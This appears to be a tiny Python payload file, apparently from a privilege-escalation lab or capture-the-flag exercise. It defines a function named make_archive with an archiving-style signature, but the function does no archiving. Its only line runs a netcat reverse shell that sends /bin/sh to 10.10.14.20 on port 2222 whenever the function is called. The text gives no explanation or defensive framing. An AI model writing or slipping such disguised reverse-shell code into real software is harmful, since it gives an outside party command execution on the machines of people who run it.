import os 

def make_archive(a, b, c):
	os.system('nc 10.10.14.20 2222 -e "/bin/sh"')